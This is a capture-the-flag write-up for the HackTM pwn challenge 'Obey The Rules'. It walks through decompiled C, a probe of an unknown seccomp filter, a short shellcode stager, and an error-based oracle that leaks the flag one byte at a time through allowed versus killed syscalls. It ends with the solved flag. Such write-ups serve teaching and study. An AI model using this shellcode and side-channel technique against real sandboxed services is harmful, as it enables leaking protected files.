# **Obey The Rules**

#### tag : pwn(445p)

-----------------------------------------------

#### Description

>The government has released a new set of rules. Do you choose to be among those who follow them blindly or among those who read them first?

>Flag Path: /home/pwn/flag.txt

>Author: FeDEX

>Remote: nc 138.68.67.161 20001

-----------------------------------------------

#### Solution

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int16 v4; // [rsp+10h] [rbp-80h]
  void *v5; // [rsp+18h] [rbp-78h]
  char s; // [rsp+20h] [rbp-70h]
  unsigned __int64 v7; // [rsp+88h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init_proc(*(_QWORD *)&argc, argv, envp);
  memset(&s, 0, 0x64uLL);
  open_read_file("header.txt", 100LL, &s);
  puts(&s);
  open_read_file("description.txt", 800LL, &description);
  printf("\n    %s\n  ", &description);
  puts(" >> Do you Obey? (yes / no)");
  read(0, &answer, 0xBuLL);
  v4 = (signed int)open_read_file("RULES.txt", 150LL, &rules) >> 3;
  v5 = &rules;
  if ( prctl(38, 1LL, 0LL, 0LL, 0LL) < 0 )
  {
    perror("prctl(PR_SET_NO_NEW_PRIVS)");
    exit(2);
  }
  if ( prctl(22, 2LL, &v4) < 0 )
  {
    perror("prctl(PR_SET_SECCOMP)");
    exit(2);
  }
  if ( !strcmp(&answer, "Y") )
    set_context(&answer, "Y");
  else
    system("/bin/sh");
  return 0;
}
```
Challenge make seccomp rule from `RULES.txt` in server, so that we can't check seccomp rule by `seccomp-tools`.

```c
  v4 = (signed int)open_read_file("RULES.txt", 150LL, &rules) >> 3;
  v5 = &rules;
  if ( prctl(38, 1LL, 0LL, 0LL, 0LL) < 0 )
  {
    perror("prctl(PR_SET_NO_NEW_PRIVS)");
    exit(2);
  }
  if ( prctl(22, 2LL, &v4) < 0 )
  {
    perror("prctl(PR_SET_SECCOMP)");
    exit(2);
  }
```

After seccomp rule released, we can execute 0xb byte shellcode in `set_context()` if 2 byte of shellcode is 'Y\x00'. Otherwise we can call system("/bin/sh"), but this is banned by seccomp rule. It return bad system call. So we use `set_context()`.

```c
  ...
  read(0, &answer, 0xBuLL);
  ...
  seccomp routine here
  ...
  if ( !strcmp(&answer, "Y") )
    set_context();
  else
    system("/bin/sh");
  ...

__int64 set_context()
{
  *(&answer + strlen(&answer)) = 89;
  strcpy(region, &answer);
  return ((__int64 (__fastcall *)(signed __int64, char *))region)(1337LL, &answer);
}
```

First of all, I checked seccomp rule in server. I made shellcode that call each syscall and got server's response. `ALLOW` syscall return `Segfault` but `KILL` syscall return `Bad system call`. Here is my check code [check.py](./check.py).

```
mov al, n (n=0~0xff)
syscall
```

This is result of `check.py`. There are only 3 syscall available. We have to solve this challenge using `read`, `open`, `exit`.

```
0 ok
1 bad
2 ok
...
60 ok
...
```

There is no way to print data from server, So we have to use `error-based shellcode` which that use reaction of server. In the case, we can use server's seccomp reaction. If we call bad syscall, server return `Bad system call`, but using `exit` which is allowed, server return normally.

So, we open flag.txt and compare byte one by one. And if it's correct ascii byte, jmp to exit syscall or not jmp to bad syscall. So that we can know flag's byte.

Here is pseudocode. It's form that we have to make in shellcode.

```
fd = open("/home/pwn/flag.txt");
read(fd, buf, 0x100);
for(int i=0; i<0x100; i++) {
  for(int j=0; j<0xff; j++) {
    if(buf[i] == j) {
      exit(0);
    }
    else {
      syscall(); // whatever except for read, open, exit
    }
  }
}

```

Before that, we have to read more byte. 0xb byte is not enough to work like upper pseudocode. So, we use this 0xb shellcode to read more byte.

Fortunately, at the point of execution of shellcode, value of rsp contain &shellcode which is mapped as `region` and rdx is big trash value. So just set rdi to 0(stdin) and pop `region`'s address to rsi, then call read.

```
pop rcx ; Y(prefix)
pop rcx ; Y(prefix)
xor di, di
pop rsi
xor eax, eax
syscall
```

Great, We can call read(0, region[&shellcode], n). Putting second shellcode with 0x10 byte dummy, we can run new shellcode continuosly. 

After reading new shellcode, mabye find something weird(bad syscall retunred from read(3,buf,n)) when read flag after open. Yes, server's seccomp rule have read's A0 comparing.

So we can guess server's seccomp rule like:

```
scmp_filter_ctx ctx;
ctx = seccomp_init(SCMP_ACT_KILL);

seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 1, SCMP_CMP_NE(3));
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);

seccomp_load(ctx);
seccomp_release(ctx);
```

Well, just open flag.txt one more time, then 4 is allcated as fd. Here is psuedo shellcode that comparing flag one by one.

```
open('/home/pwn/flag.txt')
open('/home/pwn/flag.txt')
read(4, 'rsp', 0x100)
mov rax, [rsp+i]          ; i is index of flag
cmp al, j                 ; j is byte of flag
je good
xor eax, eax
mov al, 59 
syscall                   ; call execve(bad syscall)
good:
xor eax, eax
mov al, 60
syscall                   ; call exit
```

Here is my last exploit code, [solve.py](./solve.py).

**HackTM{kn0w_th3_rul3s_we11_s0_y0u_c4n_br34k_th3m_EFFECTIVELEY}**